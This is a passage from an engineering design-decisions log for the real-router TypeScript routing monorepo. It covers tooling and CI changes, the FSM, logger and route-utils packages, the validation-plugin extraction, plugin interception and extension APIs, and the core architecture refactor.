**Solid exception (#422):** 7 Solid adapter tests (`RouterProvider.test.tsx`) are `.todo()` — babel-preset-solid compiles JSX at transform time, and `resolve.alias` creates dual-module hazard with Solid's `createContext()`. These tests pass when `"development"` condition exists in exports (uniform resolution). Fix tracked in #422.

### Self-Import Fix (historical)

Packages that imported themselves by published name broke with `customConditions` during build. Fixed by replacing self-imports with relative imports in `@real-router/core` (2 files) and `@real-router/react` (3 files). This fix remains valid — self-imports are still relative.

## Infrastructure Changes (rou3 Migration — historical)

### SonarQube Scanner Rename

Package `sonarqube-scanner` renamed to `@sonar/scan` (upstream rename). Updated in `package.json`:

```json
// Before
"sonarqube-scanner": "4.3.4"
// After
"@sonar/scan": "4.3.4"
```

Script updated: `sonar-scanner` → `sonar` in `package.json` scripts.

### Core Package Exports

Removed `"./dist/*": "./dist/*"` wildcard export from `packages/core/package.json`. This was used by `router-benchmarks` (now at `benchmarks/`) to load compiled dist directly. Replaced with direct require of `@real-router/core/dist/cjs/index.js`.

### Vitest: Removed `clearMocks`

Removed `clearMocks: true` from `vitest.config.common.mts`. `restoreMocks: true` + `mockReset: true` already cover all cleanup. `clearMocks` was redundant (subset of `mockReset`).

### Workspace Cleanup

`pnpm-workspace.yaml`: removed `tools/*` glob and `minimumReleaseAgeExclude` entries for legacy `router6`/`router6-types` packages.

### Examples Workspace

~130 example applications across 6 framework adapters (React, Preact, Solid, Vue, Svelte, Angular) plus terminal and desktop runtimes. Organized by runtime:

```
examples/
├── web/
│   ├── react/{app-name}/         # incl. animation-examples × 4 + ssr-examples × 5 (RSC adds 1)
│   ├── preact/{app-name}/        # incl. animation-examples × 4 + ssr-examples × 4
│   ├── solid/{app-name}/         # incl. animation-examples × 4 + ssr-examples × 4
│   ├── vue/{app-name}/           # incl. animation-examples × 4 + ssr-examples × 4
│   ├── svelte/{app-name}/        # incl. animation-examples × 4 + ssr-examples × 4
│   └── angular/{app-name}/       # incl. animation-examples × 4 + ssr-examples × 4
├── console/
│   └── react-ink/                # CLI demo via @real-router/react/ink + memory-plugin
└── desktop/
    ├── electron/{react,react-hash,react-navigation}/
    └── tauri/{react,react-navigation}/
```

`pnpm-workspace.yaml` includes nested globs (`examples/*/*`, `examples/*/*/*`, `examples/*/*/*/*`) to pick up the deepest sub-app directories (`animation-examples/*`, `ssr-examples/*`). Examples are private packages (`"private": true`) that use workspace packages via `workspace:^`.

**Turbo exclusion:** Examples use `build:app` instead of `build` in their scripts to avoid triggering turbo's `build` pipeline. `turbo run build` only matches packages with a `build` script — examples are excluded.

**knip exclusion:** `ignoreWorkspaces: ["examples/**"]` prevents false positives from example-specific dependencies. Uses `**` glob to match the nested directory structure.

**syncpack exclusion:** `syncpack.config.mjs` `source` only covers `packages/*/package.json` — examples are automatically excluded from version consistency checks.

### E2e Spec Lint Check

**Problem:** Examples with `playwright.config.ts` but empty or missing `e2e/` directories pass CI silently — the e2e test task finds nothing to run and reports success.

**Solution:** `scripts/check-e2e-specs.sh` iterates over `examples/*/*/playwright.config.ts`, verifies each has an `e2e/` directory with at least one `*.spec.ts` file. Exits with error if any violations found.

```bash
pnpm lint:e2e    # runs scripts/check-e2e-specs.sh
```

Added to pre-commit hook to catch missing specs before push.

### knip: Router Benchmarks Entry

Added `packages/router-benchmarks` (now at `benchmarks/`, `src/` renamed to `core/`) workspace to `knip.json` with `entry: ["src/**/*.ts"]` to recognize standalone benchmark scripts (like `isolated-anomalies.ts`) that are not imported from `index.ts`. Later moved to `ignoreWorkspaces` when benchmarks were relocated to root level.

## FSM Package

### Why a Separate Package?

`@real-router/fsm` is a standalone synchronous finite state machine engine extracted as its own package. It has **zero dependencies** and can be used independently of the router.

### Design Decisions

**Single-class, no validation:** The entire FSM is ~148 lines. TypeScript generics enforce correctness at compile time — no runtime validation of config, states, or events. This keeps the hot path allocation-free.

**O(1) transitions:** A `#currentTransitions` cache stores the transition map for the current state, avoiding double lookup (`transitions[state][event]`).

**`canSend(event): boolean`** — O(1) check if event is valid in current state. Uses cached `#currentTransitions`.

**`on(from, event, action): Unsubscribe`** — typed action for a specific `(from, event)` pair. Lazy `#actions` Map (`null` until first `on()`). Uses nested `Map<TStates, Map<TEvents, action>>` for O(1) lookup without string concatenation. Actions fire before `onTransition` listeners. Overwrite semantics (second `on()` for same pair replaces first).

**`forceState(state)`** — direct state update without dispatching actions or notifying listeners. Used by router's navigate hot path to bypass `send()` overhead.

**Null-slot listener pattern:** Unsubscribed listeners are set to `null` instead of spliced, preventing array reallocation. New listeners reuse null slots.

**Listener count fast-path:** `#listenerCount` tracks active listeners. When zero, `send()` skips `TransitionInfo` object creation and listener iteration entirely.

**Type-safe payloads via `TPayloadMap`:** A fourth generic parameter maps event names to payload types. Events not in the map accept no payload. Uses optional `payload?` parameter (not rest params — V8 always allocates an array for rest params even when empty).

### Reentrancy

`send()` inside `onTransition` is allowed and executes synchronously inline (no queue). State is updated before listeners fire, so reentrant `send()` reads the already-updated state. Callers must prevent infinite loops.

### Package Structure

```
packages/fsm/
├── src/
│   ├── fsm.ts    — FSM class (all logic, ~137 lines)
│   ├── types.ts  — FSMConfig, TransitionInfo, TransitionListener
│   └── index.ts  — public exports
└── tests/
    └── functional/  — vitest tests (100% coverage)
```

## Logger Package

### Why?

**Isomorphic** — works in browser, Node.js, and environments without `console` (React Native, Electron, edge runtimes).

### Features

| Feature                 | Description                                           |
| ----------------------- | ----------------------------------------------------- |
| **Level filtering**     | `all` → `warn-error` → `error-only` → `none`          |
| **Safe console access** | Checks `typeof console !== "undefined"` before output |
| **Callback system**     | Custom log handler for any environment                |

### Callback Use Cases

```typescript
// 1. Console emulation (environments without console)
callback: (level, context, message) => {
  NativeModules.Logger[level](`[${context}] ${message}`);
}

// 2. Error tracking (Sentry, etc.)
callback: (level, context, message) => {
  if (level === "error") Sentry.captureMessage(message);
}

// 3. Both: silent console + full monitoring
{
  level: "none",              // No console output
  callbackIgnoresLevel: true, // Callback gets everything
  callback: sendToMonitoring,
}
```

### Configuration via Router

```typescript
const router = createRouter(routes, {
  logger: { level: "error-only", callback: errorTracker },
});
```

### Package Dependencies

All packages using logger declare `"logger": "workspace:^"` dependency.

Migrated: `@real-router/core`, `@real-router/browser-plugin`, `@real-router/logger-plugin`.

## Logger Plugin Performance Tracking

### Timing Display

Transition duration with adaptive units:

| Duration | Format       | Example     |
| -------- | ------------ | ----------- |
| < 0.1ms  | Microseconds | `(27.29μs)` |
| ≥ 0.1ms  | Milliseconds | `(15.00ms)` |

### Time Provider

Monotonic time source with environment-aware fallback:

```
Browser           → performance.now()
Node.js 16+       → performance.now() from perf_hooks
Node.js <16       → Date.now() with monotonic emulation
```

**Monotonic emulation** — `Date.now()` can go backwards (NTP sync, DST). Wrapper tracks `lastTimestamp` and adds offset if time decreases.

### Performance API Integration

Creates marks and measures for DevTools Performance tab:

```
Marks:
├── router:transition-start:{from}→{to}
├── router:transition-end:{from}→{to}     (success)
├── router:transition-cancel:{from}→{to}  (cancelled)
└── router:transition-error:{from}→{to}   (error)

Measures:
├── router:transition:{from}→{to}           (success)
├── router:transition-cancelled:{from}→{to} (cancelled)
└── router:transition-failed:{from}→{to}    (error)
```

**Safe API access** — checks `typeof performance.mark === "function"` before use.

### SSR Note

For high-precision timing in Node.js without global `performance`:

```typescript
import { performance } from "perf_hooks";
globalThis.performance = performance;
```

## Route Utils Package

### Why?

`@real-router/route-utils` provides a cached read-only query API for route tree structure and segment testing utilities. Consolidates `@real-router/helpers` (segment testers) and adds new pre-computed queries (chains, siblings, descendant checks).

### Design Decisions

**Pre-computed chains and siblings:** Constructor eagerly walks the entire tree once, building `Map<string, readonly string[]>` for chains and siblings. All subsequent lookups are O(1) Map reads returning frozen arrays (referential equality on repeated calls).

**WeakMap factory caching:** `getRouteUtils(root)` caches instances via `WeakMap<RouteTreeNode, RouteUtils>`. Since `RouteTree` is immutable (`Object.freeze`), every mutation creates a new root — automatic cache invalidation without manual `rebuild()`.

**Structural typing for RouteTree:** `route-utils` defines a minimal `RouteTreeNode` interface locally (`fullName`, `children`, `nonAbsoluteChildren`) instead of importing `RouteTree` from the internal `route-tree` package. This eliminates the runtime dependency — TypeScript structural typing ensures compatibility when passing the real `RouteTree` object.

**Static facade for segment testers:** `RouteUtils.startsWithSegment`, `.endsWithSegment`, `.includesSegment`, `.areRoutesRelated` are static properties delegating to standalone functions. This provides a single import entry point while keeping functions tree-shakeable as standalone exports.

### Removed Packages

- **`@real-router/helpers`** — all functionality migrated into `@real-router/route-utils` (segment testers + `areRoutesRelated`)
- **`@real-router/cache-manager`** — `KeyIndexCache` and `CacheManager` were unused after RouteUtils adopted WeakMap-based caching; removed entirely

## Dependencies

### Pinned Versions

`.npmrc` has `save-exact=true` - all dependencies use exact versions, not ranges.

### @types/node Override

```json
"pnpm": {
  "overrides": {
    "@types/node": "$@types/node"
  }
}
```

Forces all packages to use the same @types/node version from root.

### pnpm 10 Settings

`.npmrc`:

```ini
strict-dep-builds=true       # Lifecycle scripts disabled by default; only onlyBuiltDependencies allowed
cleanup-unused-catalogs=true # Auto-cleanup unused catalog entries
script-shell=bash            # Use bash for script execution
```

`pnpm.onlyBuiltDependencies` in root `package.json` allowlists packages that may run lifecycle scripts: `@parcel/watcher`, `core-js`, `electron`, `esbuild`, `fsevents`, `lmdb`, `msgpackr-extract`, `unrs-resolver`, `vue-demi`. See "Supply-Chain Security › Minimum Release Age (Removed)" above for the rationale.

### Strict Peer Dependencies

`.npmrc`:

```ini
auto-install-peers=true
strict-peer-dependencies=true
```

**Why this combination:**

| Setting                    | Value | Effect                                                  |
| -------------------------- | ----- | ------------------------------------------------------- |
| `auto-install-peers`       | true  | pnpm automatically selects compatible peer dep versions |
| `strict-peer-dependencies` | true  | Peer dep conflicts = error (not warning)                |

**Why not `auto-install-peers=false`:**

Tried full strict mode but it broke React tests. When manually specifying react/react-dom versions (18.2.0 or 18.3.1), 2 tests failed. pnpm's auto-install-peers resolves complex version compatibility that's hard to replicate manually.

**Issues found and fixed:**

1. **Missing `react-dom` in peerDependencies** — `@real-router/react` had `react` but not `react-dom`
2. **Hidden dependency on auto-install-peers** — Tests relied on pnpm selecting compatible React versions automatically

**Result:** Peer dep conflicts now fail `pnpm install` instead of being silent warnings.

## Core Architecture

### Namespace-Based Design

**Problem:** Original `@real-router/core` had a monolithic structure with decorators in `src/core/`:

```
src/core/
├── dependencies.ts    (700+ lines)
├── middleware.ts      (300+ lines)
├── navigation.ts      (400+ lines)
├── observable.ts      (700+ lines)
├── options.ts         (300+ lines)
├── plugins.ts         (300+ lines)
├── routeLifecycle.ts  (400+ lines)
├── routerLifecycle.ts (400+ lines)
├── state.ts           (700+ lines)
└── routes/
    ├── routeConfig.ts (900+ lines)
    ├── routePath.ts   (300+ lines)
    ├── routeQuery.ts  (400+ lines)
    └── routeTree.ts   (700+ lines)
```

Issues:

- Circular dependencies between decorators
- Hard to test individual concerns
- Unclear boundaries of responsibility
- Router.ts was a god class (2500+ lines)

**Solution:** Migrated to **facade + namespaces + standalone API** pattern:

```
src/
├── Router.ts (facade, ~670 lines)
├── createRouter.ts           — factory function (public entry)
├── getNavigator.ts           — frozen read-only router subset
├── internals.ts              — WeakMap<Router, RouterInternals> registry
├── guards.ts                 — guard-related logic
├── validation.ts             — structural validation
├── typeGuards.ts             — type guard functions
├── stateMetaStore.ts         — WeakMap<State, Params> (replaces State.meta)
├── helpers.ts                — internal utilities
├── constants.ts              — error codes, constants
├── types.ts                  — core type definitions
├── types/                    — additional type modules
├── fsm/
│   ├── routerFSM.ts          — FSM config, states, events, factory
│   └── index.ts
├── api/                      — standalone functions (tree-shakeable)
│   ├── getRoutesApi.ts       — route CRUD
│   ├── getDependenciesApi.ts — dependency CRUD
│   ├── getLifecycleApi.ts    — guard management
│   ├── getPluginApi.ts       — plugin management
│   ├── cloneRouter.ts        — SSR cloning
│   ├── types.ts              — API return types
│   └── index.ts
├── utils/                    — SSR/SSG utilities
│   ├── serializeState.ts     — XSS-safe JSON serialization
│   ├── getStaticPaths.ts     — static path enumeration for SSG
│   └── index.ts
├── wiring/
│   ├── RouterWiringBuilder.ts — Builder: namespace dependency wiring
│   ├── wireRouter.ts          — Director: calls wire methods in correct order
│   ├── types.ts               — WiringOptions<Dependencies> interface
│   └── index.ts
└── namespaces/
    ├── RoutesNamespace/
    │   ├── RoutesNamespace.ts
    │   ├── routesStore.ts     — plain data store (RoutesStore)
    │   ├── forwardToValidation.ts
    │   ├── constants.ts
    │   ├── helpers.ts
    │   ├── validators.ts
    │   └── types.ts
    ├── DependenciesNamespace/
    │   ├── dependenciesStore.ts — plain data store (DependenciesStore)
    │   └── validators.ts
    ├── EventBusNamespace/     — FSM + EventEmitter encapsulation (replaces ObservableNamespace)
    ├── StateNamespace/
    ├── NavigationNamespace/
    ├── OptionsNamespace/
    ├── PluginsNamespace/
    ├── RouteLifecycleNamespace/
    ├── RouterLifecycleNamespace/
    └── index.ts               — (9 namespaces total)
```

**Benefits:**

- Clear separation of concerns
- Each namespace is independently testable
- No circular dependencies
- Router.ts is thin facade (validation + delegation)
- Namespace internals are encapsulated
- Standalone API functions are tree-shakeable (only bundled when imported)

**Migration:** Completed January 2026. Legacy `src/core/` folder deleted after full test coverage verification.

### Validation Pattern

**Two entry points, same validators:**

1. **Facade methods** (Router.ts) — call through `ctx.validator?.ns.fn()` (optional chaining)
2. **Standalone API** (`api/get*Api.ts`) — same pattern

```typescript
// Router.ts (facade path)
buildPath(route: string, params?: Params): string {
  ctx.validator?.routes.validateBuildPathArgs(route);  // no-op if plugin absent
  return getInternals(this).buildPath(route, params);
}

// api/getRoutesApi.ts (standalone API path)
add(routes) {
  ctx.validator?.routes.validateAddRouteArgs(routes);  // no-op if plugin absent
  addRoutes(store, routes);
}
```

Validators live in the namespace folder (`namespaces/XxxNamespace/validators.ts`) and are imported by `@real-router/validation-plugin`, not by core itself. Core only defines the `RouterValidator` interface in `src/types/RouterValidator.ts`.

### Validation Plugin Extraction

**Problem:** Validation code accounted for roughly 25% of the core bundle. It was always included — even in production builds where argument errors are impossible (TypeScript enforces call sites). Users had no way to opt out.

**Solution:** `@real-router/validation-plugin` — a standalone opt-in plugin. Core ships with structural guards and invariant protection only — no DX validation logic. The plugin installs a `RouterValidator` object into `RouterInternals.validator` at registration time. All call sites in core use `ctx.validator?.ns.fn()` — a no-op when the plugin is absent.

**Before:**

```typescript
// Router.ts — validation always ran, bundled unconditionally
buildPath(route: string, params?: Params): string {
  if (!this.#noValidate) {
    validateBuildPathArgs(route);  // always in the bundle
  }
  return this.#routes.buildPath(route, params, this.#options.get());
}
```

**After:**

```typescript
// Router.ts — validation is a no-op when plugin is not registered
buildPath(route: string, params?: Params): string {
  ctx.validator?.routes.validateBuildPathArgs(route);  // tree-shaken if unused
  return getInternals(this).buildPath(route, params);
}

// App setup — opt in explicitly
router.usePlugin(validationPlugin());
```

**Why this approach:**

- **Preact debug pattern** — Preact ships `preact/debug` as a separate opt-in import. Same idea: DX tooling is separate from the runtime.
- **User control** — production builds skip the plugin entirely. Development builds register it. No `__DEV__` flags, no build-time conditionals, no bundler magic required.
- **Runtime-agnostic** — works identically in browser, Node.js, and edge runtimes. No environment detection.
- **Retrospective validation** — the plugin validates already-registered routes and dependencies on install, catching mistakes made before the plugin was registered.
- **Atomic rollback** — if retrospective validation fails, `ctx.validator` is reset to `null` before the error propagates. The router stays in a consistent state.

### Phase 2 — DX Validator Extraction

**Problem:** After Phase 1, roughly 17 DX validators and warnings remained in core, called unconditionally (not behind `ctx.validator?.`). These included dependency count checks, clone arg validation, lifecycle overwrite warnings, plugin key validation, and route callback guards.

**Solution:** Moved all remaining DX validators behind the `ctx.validator?.` pattern. Added 17 new slots to the `RouterValidator` interface. Core now contains only structural guards (constructor, plugin registration) and two invariant guards.

**Why:** Completes the "zero DX validation in core" principle. Every DX check is now opt-in through the plugin.

### Invariant Guard Policy

**Problem:** After extracting all validation, the question arose: should core have any runtime checks at all? The RFC proposed 12 crash guards. Architectural review argued most are redundant — TypeScript catches at compile time, the plugin catches at dev runtime, and the JS runtime crashes with a stack trace.

**Solution:** Only 2 invariant guards remain in core: (1) `subscribe(listener)` — deferred crash with an actionable hint, (2) `navigateToNotFound(path)` — silent state corruption. The criterion: guard only for (a) silent corruption or (b) a deferred crash in a user-facing API where context is lost.

**Why:** Three-tier protection (TypeScript, plugin, JS runtime) covers most cases. Core guards are reserved for cases where the error manifests far from the cause or doesn't manifest at all.

### Error Message Consistency

**Problem:** The validation plugin had three different prefix formats (`[router.METHOD]`, `[real-router]`, no prefix), missing "got X" clauses, and inconsistent `Error` types for the same error class.

**Solution:** Unified to `[router.METHOD]` for API errors and `[validation-plugin]` for retrospective validation. Added `"got ${typeDescription}"` to all type errors. Standardized error types: `TypeError` (wrong type), `ReferenceError` (not found), `RangeError` (limit exceeded).

**Why:** Consistent format improves grep-ability and debuggability. Typed errors enable `instanceof`-based error handling.

### usePlugin Falsy Filtering

**Problem:** Conditional plugin registration requires verbose `if` blocks. The common JS pattern `__DEV__ && plugin()` produces `false` which `usePlugin` rejected with `TypeError`.

**Solution:** `usePlugin()` filters arguments with `plugins.filter(Boolean)` before validation. Falsy values (`undefined`, `null`, `false`) are silently skipped.

**Why:** Enables inline conditional registration — a familiar JS pattern (like React children). `router.usePlugin(browserPlugin(), __DEV__ && validationPlugin())` reads naturally and works without wrapper `if` blocks.

### Plugin Interception Pattern

**Problem discovered:** After moving business logic into namespaces, plugins could no longer intercept router methods by overriding `router.forwardState` (monkey-patching). The namespace calls its own `forwardState`, bypassing any plugin override on the router facade.

**Original (broken) approach:** Plugins monkey-patched router methods directly:

```typescript
// persistent-params-plugin (old approach)
const originalForwardState = router.forwardState;
router.forwardState = (name, params) => {
  const result = originalForwardState(name, params);
  return { ...result, params: withPersistentParams(result.params) };
};
```

**Solution:** Universal `addInterceptor()` API on `PluginApi`:

```typescript
// persistent-params-plugin (new approach)
const api = getPluginApi(router);
api.addInterceptor("forwardState", (next, routeName, routeParams) => {
  const result = next(routeName, routeParams);
  return { ...result, params: withPersistentParams(result.params) };
});
```

**Implementation:** `createInterceptable(fn, interceptors, method)` in `internals.ts` wraps router methods at wiring time. When an interceptor is registered, the wrapped method executes the interceptor chain (FIFO order) before calling the original. The `InterceptableMethodMap` interface defines interceptable methods: `start`, `buildPath`, `forwardState`.

**Rule:** Methods that plugins may intercept must go through `RouterInternals` (WeakMap-based), not be called directly on namespace instances.

### Router Extension Pattern

**Problem:** Plugins that add methods to the router instance (e.g., `browser-plugin` adding `buildUrl`, `matchUrl`, `replaceHistoryState`) used manual property assignment with no conflict detection and manual cleanup:

```typescript
// browser-plugin (old approach)
Object.assign(this.#router, { buildUrl, matchUrl, replaceHistoryState });
// teardown:
delete (this.#router as any).buildUrl;
delete (this.#router as any).matchUrl;
delete (this.#router as any).replaceHistoryState;
```

Issues: no conflict detection if two plugins assign the same key, manual `delete` cleanup is error-prone, no safety net if plugin forgets cleanup.

**Solution:** `extendRouter()` on `PluginApi`:

```typescript
// browser-plugin (new approach)
const api = getPluginApi(router);
const removeExtensions = api.extendRouter({
  buildUrl,
  matchUrl,
  replaceHistoryState,
});
// teardown:
removeExtensions(); // idempotent, auto-cleans all keys
```

**Implementation:** `extendRouter()` in `getPluginApi.ts` uses a two-loop pattern (validate-all, then assign-all) for atomicity. Throws `RouterError(PLUGIN_CONFLICT)` if any key already exists. Tracks assigned keys in `RouterInternals.routerExtensions` for safety-net cleanup during `dispose()`.

### Standalone API Extraction (Modular Architecture)

**Problem:** All API surface was on the Router class, making it impossible to tree-shake unused features (e.g., dependency management, guard management, cloning).

**Solution:** Extract domain-specific operations into standalone functions that access router internals via a `WeakMap`:

```typescript
// internals.ts — module-level registry
const internals = new WeakMap<object, RouterInternals>();

export function getInternals(router: Router): RouterInternals {
  const ctx = internals.get(router);
  if (!ctx) throw new TypeError("Invalid router instance");
  return ctx;
}

// Router.ts — registers on construction
registerInternals(this, { makeState, forwardState, dependenciesGetStore, ... });

// api/getDependenciesApi.ts — consumer
export function getDependenciesApi(router: Router): DependenciesApi {
  const ctx = getInternals(router);
  const store = ctx.dependenciesGetStore();
  return { set(name, value) { /* operates on store directly */ } };
}
```

**Store pattern:** Heavy namespaces (DependenciesNamespace, RoutesNamespace parts) replaced with plain data stores (`DependenciesStore`, `RoutesStore`) — interfaces + factory functions, no classes. CRUD logic moved into the corresponding API function as module-private functions. This enables tree-shaking: if `getDependenciesApi` is not imported, its CRUD logic is dead-code-eliminated.

**Extracted APIs:** `getRoutesApi`, `getDependenciesApi`, `getLifecycleApi`, `getPluginApi`, `cloneRouter`.

**Tree operations injection (removed, #909):** `store.treeOperations` used to inject `commitTreeChanges` / `resetStore` / `nodeToDefinition` into the store so `getRoutesApi` could reach them without direct imports. The stated rationale (avoid static `route-tree` import chains) did not hold — `route-tree` is `alwaysBundle`d into core (a direct `nodeToDefinition` import adds no weight), and `commitTreeChanges`/`resetStore` already live in `routesStore`, which `getRoutesApi` imports anyway. Replaced with direct static imports; the per-store `treeOperations` object is gone.

### FSM Migration: dispose(), TransitionMeta, Event Flow

#### dispose() — Terminal State

Router supports permanent disposal via `router.dispose()`. RouterFSM transitions to terminal `DISPOSED` state. All mutating methods throw `ROUTER_DISPOSED` after disposal.

**Cleanup order:** plugins → eventBus → routes+lifecycle → state → deps → currentToState → markDisposed

**Idempotency:** Second call is a no-op (FSM state check prevents double-cleanup).

#### Enhanced State Object (TransitionMeta)

After each navigation, `state.transition` contains `TransitionMeta` with:

- `reload` — `true` after `navigate(..., { reload: true })` (optional)
- `redirected` — `true` if navigation was redirected via `forwardTo` (optional)
- `phase` — last pipeline phase reached (`"deactivating"` | `"activating"`)
- `from` — previous route name (undefined on first navigation)
- `reason` — always `"success"` for resolved navigations
- `blocker` — guard name that blocked the transition (reserved, not yet populated by core)
- `segments` — `{ deactivated, activated, intersection }` (all deeply frozen arrays)

`TransitionMeta` is built by `NavigationNamespace` after each successful navigation and attached to the state object before freezing. Transition timing is available via `@real-router/logger-plugin`.

#### FSM-Driven Event Flow

Router events originate from FSM state changes. The navigate hot path uses `forceState()` for direct state updates + manual emit (bypassing `send()` dispatch overhead):

```
navigate() → fsm.forceState(TRANSITION_STARTED) + emitTransitionStart()
           → [guard pipeline — optimistic sync execution]
           → fsm.forceState(READY) + emitTransitionSuccess()

stop()    → routerFSM.send("CANCEL")  → emitTransitionCancel()  (if transitioning)
          → routerFSM.send("STOP")    → emitRouterStop()
```

Non-navigate transitions (start, stop, dispose) still use `send()` with FSM actions via `fsm.on()`.

**Key change vs master:** `invokeEventListeners` lambdas replaced by typed FSM actions. No manual flag management (`#started`, `#active`, `#navigating` booleans removed).

#### Removed API

- **`router.cancel()`** — replaced by `AbortController` API: pass `{ signal }` to `navigate()` for external cancellation. Internally, `stop()`, `dispose()`, and concurrent navigation abort the current controller
- **`emitSuccess` parameter** — removed from `navigateToState()` (core + browser-plugin)

#### Bundle Size

Size limit: `20 kB` for `@real-router/core (ESM)` and `20 kB` for `@real-router/core/api (ESM)` in `.size-limit.js`.

### Type Guard Hierarchy

**Problem:** `isState` function existed in two places with different semantics:

1. `type-guards` package — strict validation, rejects circular refs in params (not JSON-serializable)
2. `helpers.ts` (local) — structural check only, allows any object structure

**Issue discovered:** After removing local `isState` and using `type-guards` version, `deepFreezeState` tests failed for circular reference cases.

**Root cause:** `type-guards/isState` calls `isParams` which validates serializability:

```typescript
// type-guards/isParams
function isSerializable(value, visited = new WeakSet()) {
  if (visited.has(value)) {
    return false; // Circular reference - not serializable!
  }
  // ...
}
```

**Solution:** Two-tier validation:

```typescript
// type-guards (public API)
export function isState(value): value is State {
  // Full validation: structure + params serializability
  return isRequiredFields(obj); // Uses isParams internally
}

// helpers.ts (internal)
function isStateStructural(value): value is State {
  // Structural only: just checks name/path/params exist
  return (
    typeof obj.name === "string" &&
    typeof obj.path === "string" &&
    typeof obj.params === "object" &&
    obj.params !== null
  );
}
```

**Usage:**

- `isState` from `type-guards` — for public API validation (params must be serializable)
- `isStateStructural` in `helpers.ts` — for internal operations like `deepFreezeState` that handle any structure

**Lesson:** Validation strictness depends on context. Public API should be strict; internal utilities may need flexibility.

## State.meta → WeakMap

### Problem

`State.meta` (StateMeta) — internal implementation detail (param source mapping) that leaked into the public `State` interface. Visible via autocomplete, JSON.stringify, DevTools, spread operator.

### Solution

Module-level `WeakMap<State, Params>` inside `@real-router/core` (`stateMetaStore.ts`). All consumers use `getStateMetaParams(state)` / `setStateMetaParams(state, params)` instead of `state.meta`. The `StateMeta` wrapper type was removed — the WeakMap stores `Params` directly.

### What was removed

- `meta.id` and the `#stateId` auto-increment counter — nobody read `meta.id`, so the whole pipeline was dead code
- `forceId` parameter removed from the entire `PluginApi.makeState` chain
- `areStatesEqual` no longer reads from the WeakMap — uses the cached `#urlParamsCache` instead
- `freezeStateInPlace` no longer freezes meta — it's internal, no need to freeze

### Why WeakMap over Symbol

- No TypeScript complexity (`unique symbol` + cross-package export)
- State type is fully clean — no hidden fields
- WeakMap entries are auto-collected by GC when State is dereferenced
- Complete invisibility: JSON.stringify, Object.keys, DevTools, spread — nothing leaks

### Caveats

- `deepFreezeState()` uses `structuredClone()` → clone loses WeakMap entry. `err.redirect` intentionally has no meta (only needs name + params for redirect target).
- `_MP` phantom generic preserved on `State<P, _MP>` for backward compatibility.

## TRANSITION_LEAVE_APPROVE — Observable phase between guard phases

### Problem

No hook existed for side-effects between deactivation and activation guards. Developers were forced to abuse `canDeactivate` guards for side-effects (scroll save, analytics, fetch abort) — mixing decision logic (boolean return) with side-effects (void). Guards are the wrong place: they block navigation, they run per-route, and their boolean contract makes side-effect intent invisible.

### Solution

New FSM state `LEAVE_APPROVED` between `TRANSITION_STARTED` and `READY`. New FSM event `LEAVE_APPROVE`. Public API `router.subscribeLeave(listener)` fires after all deactivation guards pass but before activation guards run. Plugin hook `onTransitionLeaveApprove(toState, fromState?)` added alongside `onTransitionStart`. Uses `forceState()` on the hot path — consistent with NAVIGATE and COMPLETE.

**Why `forceState()` not `send()`:** The pipeline is the authority on order; the FSM is a state tracker. `forceState()` is honest about this. Consistent with NAVIGATE/COMPLETE. Avoids Map lookup + action dispatch overhead on the hot path.

**Why between deactivation and activation:** Deactivation passing is the commitment point — the user (or guard) has confirmed leaving. Side-effects should only run after this decision, not before. This is the earliest safe moment for scroll save, analytics, fetch abort, and similar concerns.

**State change remains atomic** — `router.getState()` updates in one step via `completeTransition`. What's new is an observable phase (`LEAVE_APPROVED`) between deactivation and activation guard phases where side-effects are safe.

### Before

```typescript
canDeactivate: async (toState, fromState) => {
  // Mixed decision + side-effect
  const ok = await showDialog();
  if (ok) saveDraft(); // side-effect in guard
  return ok;
};
```

### After

```typescript
canDeactivate: ((toState, fromState) => showDialog(), // pure decision
  router.subscribeLeave(({ route }) => {
    if (route.name === "settings") saveDraft(); // pure side-effect, only fires when confirmed
  }));
```

## Turbo `--filter` Does Not Exclude Downstream Dependents

### Problem

`pnpm turbo run test --filter='!./examples/**'` still executes `test` tasks for example packages. Turbo `--filter` controls the initial scope but does not prevent downstream dependents from being included in the execution graph. This is a known turbo limitation ([vercel/turborepo#6505](https://github.com/vercel/turborepo/discussions/7453)) with no planned fix.

Pre-push hook and CI were running dozens of example `test` and `build` tasks on every run (today the example set alone is ~1000 turbo tasks) — adding minutes to both local and CI pipelines.

### Solution

Rename task scripts in examples so turbo cannot find them:

- `"test": "vitest run"` → `"test:unit": "vitest run"` in 30 example package.json files
- `pnpm turbo run test` no longer finds `test` script in examples → `<NONEXISTENT>` → skipped
- Examples don't have `bundle` script, so `turbo run bundle` skips them automatically
- `lint:package`/`lint:types` dependsOn changed to `bundle` (only need dist/, not full validation)

### Why not `--filter-deep`

Turbo has no `--filter-deep` flag. The RFC was closed without implementation. Our workaround (task name mismatch) is the same approach recommended in the turbo discussion — ensure filtered-out packages don't have matching script names.

### Also removed

- `pnpm-lock.yaml` from `turbo.json` `global.inputs` — lockfile changes were invalidating cache for ALL tasks across ALL packages. Dependencies are resolved by `pnpm install` before turbo runs.

### `examples/*` workspace is required

`examples/web/react/package.json` (`react-examples-shared`) hosts shared deps (`react`, `@types/react`, `@real-router/react`) for all nested examples. `../shared/Layout.tsx` imports from these — without the workspace entry, pnpm doesn't install them and `tsc -b` fails with "Cannot find module 'react'".

## CI Split: PR-only CI + Post-Merge Build

### Problem

Push to master (after PR merge) re-ran the full CI pipeline: Test ~8min + Lint ~8min + Build. Code was already verified in the PR — test and lint were redundant.

### Solution

Split into two workflow files:

- `ci.yml` — `on: pull_request` only. Single Pipeline job (test + bundle) → downstream: smoke, coverage, sonarcloud, bundle-size → CI Result gate.
- `post-merge.yml` — `on: push: branches: [master]`. Only `bundle` via turbo (remote cache makes most tasks cache hit). No test, no lint, no coverage.

### Why not conditions in one file

Adding `github.event_name == 'pull_request'` to each job makes the file harder to read. Two files — each does one thing, no conditions.

### Why no coverage on push

Coverage and SonarCloud depend on test job artifacts. Without test, there are no coverage files to upload. Codecov updates baseline from PR merge commits — no separate push upload needed.

### Release pipeline coupling

`changesets.yml` uses a `workflow_run` trigger and must reference the workflow that runs on master push. After the split, this trigger was updated from `workflows: [CI]` to `workflows: [Post-Merge Build]`. Missing this update breaks the release pipeline — changesets never triggers after merge, no Version PR is created.

## State Context — Plugin-Extensible Route Data via Claim-Based API

### Problem

Plugins stored per-route data in `WeakMap<State, T>` — parallel storage next to State. This meant no reactivity, no data locality, and each plugin inventing its own WeakMap. Consumers accessed plugin data via global methods (`router.getNavigationMeta(state)`) instead of route properties. Five plugins independently implemented the same pattern: allocate a WeakMap, set data during transition, expose a getter. The data lived outside the State object, invisible to framework adapters and to `JSON.stringify` debugging.
